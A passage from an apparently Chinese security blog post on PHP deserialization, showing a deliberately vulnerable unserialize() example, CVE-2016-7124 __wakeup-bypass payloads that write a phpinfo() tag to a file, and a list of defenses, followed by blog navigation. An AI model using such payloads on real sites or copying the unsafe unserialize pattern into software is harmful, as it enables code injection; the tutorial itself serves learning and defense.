<span class="hljs-variable">$test</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'test'</span>];
<span class="hljs-variable">$test_unser</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$test</span>);
<span class="hljs-meta">?&gt;</span>
&lt;/body&gt;
&lt;/html&gt;</code></pre>
<p>由于<code>__wakeup()</code>的执行顺序在<code>__destruct()</code>之前，所以<code>__wakeup()</code>会将对象内的所有属性设为NULL，在<code>__destruct()</code>执行时，没有内容会写到文件中。但使用漏洞，可以跳过<code>__wakeup()</code>，直接执行<code>__destruct()</code>，这样可以将属性内容写入文件中。</p>
<p>如果我们使用如下payload</p>
<pre><code class="hljs plaintext">test=O:4:"test":1:{s:4:"name";s:18:"&lt;?php phpinfo();?&gt;";}</code></pre>
<p>会执行<code>__wakeup()</code>函数，页面上会出现如下输出</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230629193140701.png" alt="image-20230629193140701"></p>
<p>如果我们使用如下payload</p>
<pre><code class="hljs plaintext">test=O:4:"test":2:{s:4:"name";s:18:"&lt;?php phpinfo();?&gt;";}</code></pre>
<p>会执行<code>__wakeup()</code>函数，页面上会出现如下输出</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230629193250527.png" alt="image-20230629193250527"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230629193319332.png" alt="image-20230629193319332"></p>
<p>这里发现个有趣的事情,echo 不能打印出PHP标识符&lt;?php,因此要url编码一下</p>
<p>GPT回答:</p>
<pre><code class="hljs plaintext">在PHP中，&lt;?php 是一个标记（tag），用于指示 PHP 代码的起始点。当使用 echo 函数时，它会将其后的内容作为字符串进行输出。但是，如果你尝试使用 echo 输出 &lt;?php，它将被解释为一个 PHP 的起始标记，而不是普通的字符串。

为了在 echo 中输出 &lt;?php 这样的 PHP 标识符，你可以使用转义字符 \ 来告诉 PHP 解释器不要将其解释为标记，而是作为普通的文本。

1.使用htmlspecialchars函数对字符串进行转义：
echo htmlspecialchars('&lt;?php');

2.将&lt;?php拆分为两部分并连接起来：
echo '&lt;?' . 'php';</code></pre>
<h2 id="防御方法">防御方法：</h2>
<p>1.严格的把控 unserailize() 函数的参数，不要给攻击者任何输入的可能<br>
2.在文件系统函数的参数可控时，对参数进行严格的过滤。<br>
3.严格检查上传文件的内容，而不是只检查文件头。<br>
4.在条件允许的情况下禁用可执行系统命令、代码的危险函数。</p>
<p>PHP手册：<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/book.stream.php">https://www.php.net/manual/en/book.stream.php</a></p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/')">浅析反序列化</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=浅析反序列化&amp;url=http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"></div></div></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/07/27/inget/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">攻防世界-inget</div></div></a></div><div class="next-post pull-right"><a href="/2023/07/27/ajax-xiang-jie/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Ajax详解</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">hybcx</h1><div class="author-info__desc">只需热爱, 未来可期！</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hybchenxing" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1761635300" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">PHP反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E4%B8%BA%E4%BD%95%E8%A6%81-php-%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.2.</span> <span class="toc-text">0X02 为何要 PHP 的序列化和反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%B8%B8%E8%A7%81%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E6%A0%BC%E5%BC%8F"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 常见的序列化格式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E6%A1%88%E4%BE%8B"><span class="toc-number">1.4.</span> <span class="toc-text">0x04 案例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E4%BF%AE%E9%A5%B0%E7%AC%A6"><span class="toc-number">1.5.</span> <span class="toc-text">0x05 访问控制修饰符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-php-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.6.</span> <span class="toc-text">0x06 PHP-反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#61-%E5%B8%B8%E8%A7%81%E7%9A%84php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">1.6.1.</span> <span class="toc-text">6.1 常见的PHP魔术方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#62-%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">1.6.2.</span> <span class="toc-text">6.2 漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#63-%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%95%E6%93%8E"><span class="toc-number">1.6.3.</span> <span class="toc-text">6.3 序列化引擎</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87%E5%B0%8Ftrick"><span class="toc-number">1.7.</span> <span class="toc-text">0x07 反序列化绕过小Trick</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#71-php71%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%B9%E7%B1%BB%E5%B1%9E%E6%80%A7%E4%B8%8D%E6%95%8F%E6%84%9F"><span class="toc-number">1.7.1.</span> <span class="toc-text">7.1 php7.1+反序列化对类属性不敏感</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#72-%E7%BB%95%E8%BF%87__wakeup"><span class="toc-number">1.7.2.</span> <span class="toc-text">7.2 绕过__wakeup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#73-%E7%BB%95%E8%BF%87%E9%83%A8%E5%88%86%E6%AD%A3%E5%88%99"><span class="toc-number">1.7.3.</span> <span class="toc-text">7.3 绕过部分正则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#74-%E5%88%A9%E7%94%A8%E5%BC%95%E7%94%A8"><span class="toc-number">1.7.4.</span> <span class="toc-text">7.4 利用引用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#75-16%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87%E5%AD%97%E7%AC%A6%E7%9A%84%E8%BF%87%E6%BB%A4"><span class="toc-number">1.7.5.</span> <span class="toc-text">7.5 16进制绕过字符的过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#76-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8"><span class="toc-number">1.7.6.</span> <span class="toc-text">7.6 PHP反序列化字符逃逸</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">1.8.</span> <span class="toc-text">0x08 对象注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-pop%E9%93%BE%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.9.</span> <span class="toc-text">0x09 POP链简单介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8"><span class="toc-number">1.10.</span> <span class="toc-text">0x10 PHP原生类反序列化利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#101-errorexception-%E5%86%85%E7%BD%AE%E7%B1%BB%E8%BF%9B%E8%A1%8C-xss"><span class="toc-number">1.10.1.</span> <span class="toc-text">10.1 Error&#x2F;Exception 内置类进行 XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#error-%E5%86%85%E7%BD%AE%E7%B1%BB"><span class="toc-number">1.10.1.1.</span> <span class="toc-text">Error 内置类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exception-%E5%86%85%E7%BD%AE%E7%B1%BB"><span class="toc-number">1.10.1.2.</span> <span class="toc-text">Exception 内置类</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#102-errorexception-%E5%86%85%E7%BD%AE%E7%B1%BB%E7%BB%95%E8%BF%87%E5%93%88%E5%B8%8C%E6%AF%94%E8%BE%83"><span class="toc-number">1.10.2.</span> <span class="toc-text">10.2 Error&#x2F;Exception 内置类绕过哈希比较</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#error-%E7%B1%BB"><span class="toc-number">1.10.2.1.</span> <span class="toc-text">Error 类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exception-%E7%B1%BB"><span class="toc-number">1.10.2.2.</span> <span class="toc-text">Exception 类</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#103-soapclient-%E7%B1%BB%E8%BF%9B%E8%A1%8C-ssrf"><span class="toc-number">1.10.3.</span> <span class="toc-text">10.3 SoapClient 类进行 SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#soapclient-%E7%B1%BB"><span class="toc-number">1.10.3.1.</span> <span class="toc-text">SoapClient 类</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#104-simplexmlelement-%E7%B1%BB%E8%BF%9B%E8%A1%8C-xxe"><span class="toc-number">1.10.4.</span> <span class="toc-text">10.4 SimpleXMLElement 类进行 XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#simplexmlelement-%E7%B1%BB"><span class="toc-number">1.10.4.1.</span> <span class="toc-text">SimpleXMLElement 类</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#105-ziparchive-%E7%B1%BB%E6%9D%A5%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6"><span class="toc-number">1.10.5.</span> <span class="toc-text">10.5 ZipArchive 类来删除文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ziparchive-%E7%B1%BB"><span class="toc-number">1.10.5.1.</span> <span class="toc-text">ZipArchive 类</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#106-%E9%81%8D%E5%8E%86%E7%9B%AE%E5%BD%95%E7%B1%BB"><span class="toc-number">1.10.6.</span> <span class="toc-text">10.6 遍历目录类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#directoryiterator-%E7%B1%BB"><span class="toc-number">1.10.6.1.</span> <span class="toc-text">DirectoryIterator 类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#filesystemiterator-%E7%B1%BB"><span class="toc-number">1.10.6.2.</span> <span class="toc-text">FilesystemIterator 类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#globiterator-%E7%B1%BB"><span class="toc-number">1.10.6.3.</span> <span class="toc-text">GlobIterator 类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%8F%AF%E9%81%8D%E5%8E%86%E7%9B%AE%E5%BD%95%E7%B1%BB%E7%BB%95%E8%BF%87-open_basedir"><span class="toc-number">1.10.6.4.</span> <span class="toc-text">使用可遍历目录类绕过 open_basedir</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#107-%E5%8F%AF%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%B1%BB"><span class="toc-number">1.10.7.</span> <span class="toc-text">10.7 可读取文件类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#splfileobject-%E7%B1%BB"><span class="toc-number">1.10.7.1.</span> <span class="toc-text">SplFileObject 类</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#108-%E5%8F%8D%E5%B0%84%E7%B1%BBreflection"><span class="toc-number">1.10.8.</span> <span class="toc-text">10.8 反射类Reflection</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#reflectionmethod-%E7%B1%BB%E8%8E%B7%E5%8F%96%E7%B1%BB%E6%96%B9%E6%B3%95%E7%9A%84%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF"><span class="toc-number">1.10.8.1.</span> <span class="toc-text">ReflectionMethod 类获取类方法的相关信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#reflectionclass%E7%B1%BB%E8%AF%BB%E5%8F%96%E7%B1%BB%E7%9A%84%E5%B1%9E%E6%80%A7%E5%92%8C%E6%96%B9%E6%B3%95%E5%90%8D"><span class="toc-number">1.10.8.2.</span> <span class="toc-text">ReflectionClass类读取类的属性和方法名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#reflectionfunction%E7%B1%BB%E5%86%99webshell"><span class="toc-number">1.10.8.3.</span> <span class="toc-text">ReflectionFunction类写Webshell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x11-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.11.</span> <span class="toc-text">0x11 Phar反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#111-%E4%BB%80%E4%B9%88%E6%98%AFphar%E6%96%87%E4%BB%B6"><span class="toc-number">1.11.1.</span> <span class="toc-text">11.1 什么是phar文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#112-phar%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%93%E6%9E%84"><span class="toc-number">1.11.2.</span> <span class="toc-text">11.2 phar文件的结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#113-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.11.3.</span> <span class="toc-text">11.3 漏洞利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#114-%E5%8F%97%E5%BD%B1%E5%93%8D%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">1.11.4.</span> <span class="toc-text">11.4 受影响的函数：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#115-%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-number">1.11.5.</span> <span class="toc-text">11.5 绕过方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#116-%E4%BB%8E-php-%E6%BA%90%E7%A0%81%E6%8E%A2%E7%B4%A2-phar-%E5%88%A9%E7%94%A8%E6%88%90%E5%8A%9F%E7%9A%84%E6%B7%B1%E5%B1%82%E5%8E%9F%E5%9B%A0"><span class="toc-number">1.11.6.</span> <span class="toc-text">11.6 从 PHP 源码探索 phar 利用成功的深层原因</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-php-%E6%B5%81%E7%9A%84%E6%A6%82%E5%BF%B5"><span class="toc-number">1.11.6.1.</span> <span class="toc-text">1. PHP 流的概念</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%B5%81%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AEwrapper"><span class="toc-number">1.11.6.2.</span> <span class="toc-text">2. 流封装协议（wrapper）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#21-http%E6%B5%81%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.11.6.2.1.</span> <span class="toc-text">2.1 http:&#x2F;&#x2F;流封装协议</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#22-file%E6%B5%81%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.11.6.2.2.</span> <span class="toc-text">2.2 file:&#x2F;&#x2F;流封装协议</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%BC%80%E5%A7%8B%E5%90%91%E4%B8%8B%E6%8C%96%E6%8E%98"><span class="toc-number">1.11.6.3.</span> <span class="toc-text">3. 开始向下挖掘</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x12-php-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.12.</span> <span class="toc-text">0x12 php-session反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#121-session%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.12.1.</span> <span class="toc-text">12.1 session简单介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#122-session-%E7%9A%84%E5%AD%98%E5%82%A8%E6%9C%BA%E5%88%B6"><span class="toc-number">1.12.2.</span> <span class="toc-text">12.2 session 的存储机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#123-session%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E7%9A%84%E5%87%A0%E4%B8%AAtip"><span class="toc-number">1.12.3.</span> <span class="toc-text">12.3 session文件创建的几个tip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#124-php-session%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="toc-number">1.12.4.</span> <span class="toc-text">12.4 PHP session工作流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#125-phpini%E4%B8%AD%E4%B8%80%E4%BA%9Bsession%E9%85%8D%E7%BD%AE"><span class="toc-number">1.12.5.</span> <span class="toc-text">12.5 php.ini中一些session配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#126-%E4%B8%8D%E5%90%8C%E7%9A%84%E5%BC%95%E6%93%8E%E6%9D%A5%E5%A4%84%E7%90%86session%E6%96%87%E4%BB%B6"><span class="toc-number">1.12.6.</span> <span class="toc-text">12.6 不同的引擎来处理session文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-php%E5%A4%84%E7%90%86%E5%99%A8"><span class="toc-number">1.12.6.1.</span> <span class="toc-text">1. php处理器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-php_binary%E5%A4%84%E7%90%86%E5%99%A8"><span class="toc-number">1.12.6.2.</span> <span class="toc-text">2. php_binary处理器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-php_serialize-%E5%A4%84%E7%90%86%E5%99%A8"><span class="toc-number">1.12.6.3.</span> <span class="toc-text">3. php_serialize 处理器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-session%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.12.6.4.</span> <span class="toc-text">4. session的反序列化漏洞利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#127-cve-2016-7124"><span class="toc-number">1.13.</span> <span class="toc-text">12.7 CVE-2016-7124</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.13.1.</span> <span class="toc-text">漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="toc-number">1.14.</span> <span class="toc-text">防御方法：</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-sha-he-gui-bi/" title="THM-沙盒规避">THM-沙盒规避</a><time datetime="2024-08-21T09:41:49.000Z" title="发表于 2024-08-21 17:41:49">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-fang-huo-qiang/" title="THM-防火墙">THM-防火墙</a><time datetime="2024-08-21T07:07:33.000Z" title="发表于 2024-08-21 15:07:33">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-wang-luo-an-quan-jie-jue-fang-an/" title="THM-网络安全解决方案">THM-网络安全解决方案</a><time datetime="2024-08-21T01:37:19.000Z" title="发表于 2024-08-21 09:37:19">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-kao-tu-di-wei-sheng/" title="THM-靠土地为生">THM-靠土地为生</a><time datetime="2024-08-20T10:08:09.000Z" title="发表于 2024-08-20 18:08:09">2024-08-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-tao-bi-ri-zhi-ji-lu-he-jian-kong/" title="THM-逃避日志记录和监控">THM-逃避日志记录和监控</a><time datetime="2024-08-20T06:51:56.000Z" title="发表于 2024-08-20 14:51:56">2024-08-20</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="hybcx" target="_blank">hybcx</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">204</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">30</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span 